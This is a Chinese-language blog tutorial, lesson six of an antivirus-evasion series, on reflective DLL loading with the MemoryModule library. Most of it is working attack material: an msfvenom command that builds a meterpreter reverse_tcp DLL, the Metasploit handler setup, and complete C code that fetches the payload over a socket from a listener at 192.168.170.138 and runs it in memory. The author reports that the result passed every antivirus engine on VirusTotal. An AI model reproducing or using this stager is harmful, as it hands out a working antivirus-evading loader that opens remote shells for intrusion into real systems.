<!DOCTYPE html>
<html lang=""><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>静态恶意代码逃逸（第六课）</title>
    <meta name="description" content="倾旋的博客">
    <meta name="author" content='倾旋'>

    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">

    
    <link rel="stylesheet" href="/sass/researcher.min.css">

    
        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
    

    
        
    
</head>

    <body><div class="container mt-5">
    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
          
          倾旋的博客
        </a>
        <div class="navbar-nav flex-row flex-wrap justify-content-center">
            
                
                
                    <a class="nav-item nav-link" href="/about" title="About">
                        About
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/links/" title="Links">
                        Links
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/post/" title="Posts">
                        Posts
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
                        Rss
                    </a>
                    
                
            
        </div>
    </nav>
</div>
<hr>
<div id="content">
<div class="container">
    <p>代码将会上传至Github，方便读者下载研究 : <a href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></p>
<h2 id="0x01-memorymodule">0x01 MemoryModule</h2>
<p>先来介绍以下MemoryModule这个项目的来源。</p>
<p><a href="https://payloads.online/archivers/2019-03-14/1">MemoryModule-实现原理</a></p>
<p>项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。</p>
<p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p>
<p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。</p>
<p>MemoryModule就是实现了这个过程：https://github.com/fancycode/MemoryModule</p>
<p>但是资料都是英文的，我在国内的社区上找到了中文版本的：https://gitee.com/china_jeffery/MemoryModule</p>
<h2 id="0x02-反射dll加载的实验">0x02 反射DLL加载的实验</h2>
<p>首先体验一下正常DLL加载的过程：</p>
<p>写一个DLL：</p>
<pre><code>#include &lt;Windows.h&gt;

VOID msg(VOID){
	MessageBox(NULL,TEXT(&quot;Test&quot;),TEXT(&quot;Hello&quot;),MB_OK);
	return;
}
</code></pre><p>这里我采用了Def文件来进行导出：</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5a58ed13a4aed12b1a466bc99899933e.png" alt="2020-01-03-13-05-56"></p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6ca6716f14e076da9718a63b0eed4684.png" alt="2020-01-03-13-06-15"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
	msg RunMsg;
	HMODULE  hBadCode <span style="color:#f92672">=</span> LoadLibrary(TEXT(<span style="color:#e6db74">&#34;BadCode-DLL.dll&#34;</span>));

	RunMsg <span style="color:#f92672">=</span> (msg)GetProcAddress(hBadCode,<span style="color:#e6db74">&#34;msg&#34;</span>);
	RunMsg();
	FreeLibrary(hBadCode);

	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p>
<p>接下来贴上MemoryModule的使用方法：</p>
<ol>
<li>将要加载的PE文件读入内存</li>
<li>初始化MemoryModule句柄</li>
<li>装载内存</li>
<li>获得导出函数地址</li>
<li>执行导出函数</li>
<li>释放MemoryModule句柄</li>
</ol>
<p>这里我将MemoryModule项目代码放入当前项目：</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1e94e086e15e9b1ade88319339dc5433.png" alt="2020-01-03-13-06-38"></p>
<p>主要是：<code>MemoryModule.h</code>、<code>MemoryModule.cpp</code></p>
<p>加载代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;MemoryModule.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);

<span style="color:#75715e">// 打开文件并获取大小
</span><span style="color:#75715e"></span>DWORD <span style="color:#a6e22e">OpenBadCodeDLL</span>(HANDLE <span style="color:#f92672">&amp;</span> hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
	DWORD dwHighFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
	DWORD dwLowFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
	<span style="color:#75715e">// 打开文件
</span><span style="color:#75715e"></span>	hBadCodeDll <span style="color:#f92672">=</span> CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
		<span style="color:#66d9ef">return</span> GetLastError();
	}
	dwLowFileSize <span style="color:#f92672">=</span> GetFileSize(hBadCodeDll,<span style="color:#f92672">&amp;</span>dwHighFileSize);
	<span style="color:#66d9ef">return</span> dwLowFileSize;
}


<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
	msg RunMsg;  <span style="color:#75715e">// msg函数的函数指针
</span><span style="color:#75715e"></span>	HMEMORYMODULE hModule; <span style="color:#75715e">// MemoryModule句柄，应该可以这么理解,,
</span><span style="color:#75715e"></span>	HANDLE hBadCodeDll <span style="color:#f92672">=</span> INVALID_HANDLE_VALUE; <span style="color:#75715e">// 打开PE文件的句柄
</span><span style="color:#75715e"></span>	WCHAR szBadCodeFile[] <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">admin</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Documents</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Visual Studio 2012</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Projects</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BadCode</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Debug</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BadCode-DLL.dll&#34;</span>); <span style="color:#75715e">// PE文件的物理路径
</span><span style="color:#75715e"></span>	DWORD dwFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// PE文件大小
</span><span style="color:#75715e"></span>	DWORD dwReadOfFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// 已读取的PE文件大小
</span><span style="color:#75715e"></span>	PBYTE bFileBuffer <span style="color:#f92672">=</span> NULL; <span style="color:#75715e">// PE文件的内存地址
</span><span style="color:#75715e"></span>	
	<span style="color:#75715e">// 打开文件
</span><span style="color:#75715e"></span>	dwFileSize <span style="color:#f92672">=</span> OpenBadCodeDLL(hBadCodeDll, szBadCodeFile);
	<span style="color:#75715e">// 如果打开失败直接退出
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
		<span style="color:#66d9ef">return</span> GetLastError();
	}
	<span style="color:#75715e">// 申请放置PE文件的内存空间
</span><span style="color:#75715e"></span>	bFileBuffer <span style="color:#f92672">=</span> new BYTE[dwFileSize];
	<span style="color:#75715e">// 读取文件
</span><span style="color:#75715e"></span>	ReadFile(hBadCodeDll,bFileBuffer,dwFileSize,<span style="color:#f92672">&amp;</span>dwReadOfFileSize,NULL);
	<span style="color:#75715e">// 如果读取错误直接退出
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(dwReadOfFileSize <span style="color:#f92672">!=</span> dwFileSize){
		<span style="color:#66d9ef">return</span> GetLastError();
	}
	<span style="color:#75715e">// 关闭打开PE文件的句柄
</span><span style="color:#75715e"></span>	CloseHandle(hBadCodeDll);
	<span style="color:#75715e">// 导入PE文件
</span><span style="color:#75715e"></span>	hModule <span style="color:#f92672">=</span> MemoryLoadLibrary(bFileBuffer);
	<span style="color:#75715e">// 如果加载失败，就退出
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hModule <span style="color:#f92672">==</span> NULL){
		delete [] bFileBuffer;
		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
	}
	<span style="color:#75715e">// 获取msg导出函数地址
</span><span style="color:#75715e"></span>	RunMsg <span style="color:#f92672">=</span> (msg)MemoryGetProcAddress(hModule,<span style="color:#e6db74">&#34;msg&#34;</span>);
	<span style="color:#75715e">// 运行msg函数
</span><span style="color:#75715e"></span>	RunMsg();
	<span style="color:#75715e">// 释放资源
</span><span style="color:#75715e"></span>	MemoryFreeLibrary(hModule);
	<span style="color:#75715e">// 释放PE内存
</span><span style="color:#75715e"></span>	delete [] bFileBuffer;

	<span style="color:#66d9ef">return</span> GetLastError();
}
</code></pre></div><p>运行结果：</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5f2ba95d5fb5ab00b0a23a48aea60935.png" alt="2020-01-03-13-06-52"></p>
<p>能够看到，成功加载并执行了msg函数。</p>
<h2 id="0x03-反射dll与msf联动">0x03 反射DLL与MSF联动</h2>
<p>不知道大家还是否记得第五课的Socket方式加载Shellcode，这里我将复用第五课的代码来实现与MSF的联动免杀。</p>
<p>思路是这样的：</p>
<p>通过Socket将Msf生成的DLL给接收到内存中，然后载入MemoryModule中，直接执行。</p>
<h3 id="生成dll">生成DLL</h3>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.138 LPORT=8899 -f dll -o ~/y.dll
</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/69f793d120060c0a0f2633ca7b9724fe.png" alt="2020-01-03-13-07-02"></p>
<p><strong>生成了一个5120字节的DLL</strong></p>
<p>然后设置一下MSF DLL发射器：</p>
<pre><code>msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.170.138 -P 8899
[*] Payload handler running as background job 0.

[*] Started reverse TCP handler on 192.168.170.138:8899 
msf5 &gt; use exploit/multi/handler 
msf5 exploit(multi/handler) &gt; set payload windows/patchupdllinject/reverse_tcp
payload =&gt; windows/patchupdllinject/reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST 192.168.170.138 
LHOST =&gt; 192.168.170.138
msf5 exploit(multi/handler) &gt; set LPORT 8888
LPORT =&gt; 8888
msf5 exploit(multi/handler) &gt; set DLL ~/y.dll
DLL =&gt; ~/y.dll
msf5 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.170.138:8888 
msf5 exploit(multi/handler) &gt; 
</code></pre><p>此时就需要来撸码了，实现一个客户端，去Msf上获取DLL：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;WinSock2.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;MemoryModule.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e">#pragma comment(lib,&#34;ws2_32.lib&#34;)
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define PAYLOAD_SIZE 1024*512
</span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span> (<span style="color:#f92672">*</span>Module)(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved);

<span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);
PBYTE bFileBuffer <span style="color:#f92672">=</span> NULL;


BOOL <span style="color:#a6e22e">GetPEDLL</span>(){
	
	DWORD dwError;
	WORD sockVersion <span style="color:#f92672">=</span> MAKEWORD(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>);
	WSADATA wsaData;
	SOCKET socks;
	SHORT sListenPort <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>;
	<span style="color:#66d9ef">struct</span> sockaddr_in sin;

	<span style="color:#66d9ef">if</span> (WSAStartup(sockVersion, <span style="color:#f92672">&amp;</span>wsaData) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
	{
		dwError <span style="color:#f92672">=</span> GetLastError();
		printf(<span style="color:#e6db74">&#34;[*]WSAStarup Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
		<span style="color:#66d9ef">return</span> FALSE;
	}
	
	socks <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	<span style="color:#66d9ef">if</span> (socks <span style="color:#f92672">==</span> INVALID_SOCKET)
	{
		dwError <span style="color:#f92672">=</span> GetLastError();
		printf(<span style="color:#e6db74">&#34;[*]Socket Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
		<span style="color:#66d9ef">return</span> FALSE;
	}

	sin.sin_family <span style="color:#f92672">=</span> AF_INET;
	sin.sin_port <span style="color:#f92672">=</span> htons(sListenPort);
	sin.sin_addr.S_un.S_addr <span style="color:#f92672">=</span> inet_addr(<span style="color:#e6db74">&#34;192.168.170.138&#34;</span>);

	<span style="color:#66d9ef">if</span>(connect(socks,(<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sin,<span style="color:#66d9ef">sizeof</span>(sin)) <span style="color:#f92672">==</span> SOCKET_ERROR )
	{
		dwError <span style="color:#f92672">=</span> GetLastError();
		printf(<span style="color:#e6db74">&#34;[*]Bind Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
		<span style="color:#66d9ef">return</span> FALSE;
	}
	
	<span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">2650</span>,NULL);
	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);

	ZeroMemory(bFileBuffer,PAYLOAD_SIZE);

	
	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">5120</span>,NULL);

	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
	{
		closesocket(socks);
	}


	<span style="color:#66d9ef">return</span> TRUE;
} 

<span style="color:#75715e">// 打开文件并获取大小
</span><span style="color:#75715e"></span>DWORD <span style="color:#a6e22e">OpenBadCodeDLL</span>(HANDLE <span style="color:#f92672">&amp;</span> hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
	DWORD dwHighFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
	DWORD dwLowFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
	<span style="color:#75715e">// 打开文件
</span><span style="color:#75715e"></span>	hBadCodeDll <span style="color:#f92672">=</span> CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
		<span style="color:#66d9ef">return</span> GetLastError();
	}
	dwLowFileSize <span style="color:#f92672">=</span> GetFileSize(hBadCodeDll,<span style="color:#f92672">&amp;</span>dwHighFileSize);
	<span style="color:#66d9ef">return</span> dwLowFileSize;
}


<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
	
	HMEMORYMODULE hModule;
	Module DllMain;
	bFileBuffer <span style="color:#f92672">=</span> new BYTE[PAYLOAD_SIZE];
	GetPEDLL();
	<span style="color:#75715e">// 导入PE文件
</span><span style="color:#75715e"></span>	hModule <span style="color:#f92672">=</span> MemoryLoadLibrary(bFileBuffer);
	<span style="color:#75715e">// 如果加载失败，就退出
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hModule <span style="color:#f92672">==</span> NULL){
		delete [] bFileBuffer;
		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
	}
	<span style="color:#75715e">// 获取msg导出函数地址
</span><span style="color:#75715e"></span>	DllMain <span style="color:#f92672">=</span> (Module)MemoryGetProcAddress(hModule,<span style="color:#e6db74">&#34;DllMain&#34;</span>);
	<span style="color:#75715e">// 运行msg函数
</span><span style="color:#75715e"></span>	DllMain(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
	<span style="color:#75715e">// 释放资源
</span><span style="color:#75715e"></span>	DWORD dwThread;
	HANDLE hThread <span style="color:#f92672">=</span> CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)DllMain,NULL,NULL,<span style="color:#f92672">&amp;</span>dwThread);
	
	WaitForSingleObject(hThread,INFINITE);
	
	MemoryFreeLibrary(hModule);
	<span style="color:#75715e">// 释放PE内存
</span><span style="color:#75715e"></span>	delete [] bFileBuffer;
	<span style="color:#66d9ef">return</span> GetLastError();
}

</code></pre></div><p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p>
<p>实现效果如下：</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/909cbbf1fff8d5d4652e00b6628e323a.png" alt="2020-01-03-13-07-19"></p>
<h2 id="0x04-总结">0x04 总结</h2>
<p>注意：学习的过程中，不同位数要对应不同的payload，编译平台也要互相对应</p>
<p>第六课就到这里了，主要是引入反射DLL加载这个技术，以及如何使用这个技术，如果想深入研究，还需要学习Windows PE相关的基础知识。</p>
<p>老样子，V站查杀一下：</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dfaa7e139b9ba7e150c830127025cabb.png" alt="2020-01-03-13-07-29"></p>
<p>挑战了全球的AV，全部通过</p>
<p><a href="https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection">https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection</a></p>
<p>所有的新技术，都离不开强大的基础知识的铺垫，通过积攒基础知识，使自己能挑战更多的&quot;不可能&quot;。</p>

</div>

        </div><div id="footer" class="mb-5">
    <hr>
    <div class="container text-center">
        
            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
        
            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
        
    </div>
    
        <div class="container text-center">
            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
        </div>
    
</div>
</body>
</html>
